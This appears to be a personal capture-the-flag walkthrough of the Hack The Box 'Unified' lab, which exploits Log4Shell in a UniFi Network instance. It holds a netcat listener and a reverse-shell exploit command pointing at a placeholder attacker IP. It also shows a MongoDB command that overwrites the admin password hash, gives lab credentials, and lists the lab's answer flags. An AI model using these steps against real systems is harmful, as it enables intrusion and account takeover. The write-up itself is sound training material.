>[!tldr] Unified is a very easy Linux machine that demonstrates the exploitation of the Log4Shell ( #CVE-2021-44228 ) vulnerability in the UniFi Network application. Enumeration reveals a vulnerable UniFi instance where a remote execution can be achieved by crafting and injecting a JNDI payload into a POST request. Then a local #MongoDB database can be leveraged to reset the administrator password and gain access to the UniFi admin panel. Plaintext SSH credentials can be discovered in the application settings leading to final privilege escalation.


# Guided Mode
---
1. `Which are the first four open ports?`
	1. In order to find open ports we will use `nmap`
```shell
nmap -sT 10.129.112.0
<SNIP>
PORT     STATE SERVICE
22/tcp   open  ssh
6789/tcp open  ibm-db2-admin
8080/tcp open  http-proxy
8443/tcp open  https-alt
```

---
2. `What is the title of the software that is running running on port 8443?`
	1. In order to find more information about port `8443` we will use `-sCV` to use nmap scripts and check versions
```shell
nmap -sCV -p8443 10.129.112.0
PORT     STATE SERVICE         VERSION
8443/tcp open  ssl/nagios-nsca Nagios NSCA
|_http-title: Did not follow redirect to /manage
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
```
- Seems that the title isn't here instead i open up a browser and use the port specifically
	- `https://10.129.112.0:8443`
	- At the top of the tab we can see the title as `UniFi Network` this is our flag
- Flag #2 -> `UniFi Network`

---
3. `What is the version of the software that is running?`
	1. In the browser still we can see the version as `6.4.54`
- Flag #3 -> `6.4.54`

---
4. `What is the CVE for the identified vulnerability?`
	1. With a quick google search i found 2 CVE's but only one was made prior to the module creation
- Flag #4 -> `CVE-2021-44228`

---
5. `What protocol does JNDI leverage in the injection?`
	1. Just reading through the description of the CVE we found the answer
- Flag #5 -> `ldap`

---
6. `What tool do we use to intercept the traffic, indicating the attack was successful?`
	1. I just guessed `TCPdump`  based off the hint, the answer can probably be found reading more about CVE-2021-44228
- Flag #6 -> `tcpdump`

---
7. `What port do we need to inspect intercepted traffic for?`
	1. We need to inspect traffic for the default `ldap` port (remember thats the protocol the CVE uses). And with a quick google search i found the answer to be either 636 or `389`
- Flag #7 -> `389`

---
- User Flag 
	- We will now use `CVE-2021-44228` and to make it easy [here is tool](https://github.com/puzzlepeaches/Log4jUnifi)
		
	1. Set listener: 
		- `sudo nc -lvnp 4444`
	2. Exploit for reverse shell
		- `python3 exploit.py -u https://10.129.112.0:8443 -i <ATTACKER_IP> -p 4444`
	3. We then enumerate and found the flag in `/home/michael/user.txt`
- User Flag -> `[REDACTED_FLAG]`

---
9. `What port is the MongoDB service running on?`
	1. Since it is a running service we can check the processes running with `ps`
```shell
$ ps
    PID TTY          TIME CMD
      1 ?        00:00:00 docker-init
      6 ?        00:00:00 bash
     16 ?        00:00:57 java
     66 ?        00:00:14 mongod
<SNIP>

$ ps -axjf
   PPID     PID    PGID     SID TTY        TPGID STAT   UID   TIME COMMAND
<SNIP>
     16      66       6       1 ?             -1 Sl     999   0:14      \_ bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
<SNIP>
```
- After reading through the results for PID "66" we can see the port it is running on and more
- Flag #9 -> `27117`

---
10. `What is the default database name for UniFi applications?`
	1. In order to enumerate the database names we first need to login to `mongo`
		1. Example: `mongo [options] [db address] [file names (ending in .js)]`
		2. `mongo 127.0.0.1:27117` -> Works!

```shell
show dbs
ace       0.002GB
ace_stat  0.000GB
admin     0.000GB
config    0.000GB
local     0.000GB
---
```

- The only non standard database is "ace" which is our flag
- Flag #10 -> `ace`

---
11. `What is the function we use to enumerate users within the database in MongoDB?`
	1. The hint was to search it up, however, I couldn't find the actual answer so i used the walk through instead
- Flag #11 -> `db.admin.find()`

---
12. `What is the function we use to update users within the database in MongoDB?`
	1. Assuming off the last question i modified the function which got me the flag
- Flag #12 -> `db.admin.update()`

---
13. `What is the password for the root user?`
	1. First, we have to select the `ace` database
		1. `use ace`
	2. Next, we use the find user function:
		1. `db.admin.find()`
		- There is going to be a lot of junk output, so I filter for "admin" with keybind `Ctrl + F`. We find this hash looking thing
		- `$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.`
		- I thought this could be cracked with `hashcat`, however, it cannot. This is a `x_shadow` variable.
	3. Instead of cracking the hash, we can create a new hash and replace the old one to change the password to whatever we want
		1. `mkpasswd -m sha-512 Password1234` or Use a [online generator](https://miniwebtool.com/sha512-hash-generator/)
		- `$6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XXM8P5Z8j4NB1gJGTONl1`
	4. We now have to use the update user function
```shell
db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XXM8P5Z8j4NB1gJGTONl1"}})
```
5. Next we login with the new credentials `administrator`:`Password1234`
6. I then looked around and found `ssh` settings which had more credentials
	1. `root`:`NotACrackablePassword4U2022`
- After logging in as root we found the flag in `root.txt`
- Root Flag -> *whoops forgot to paste here*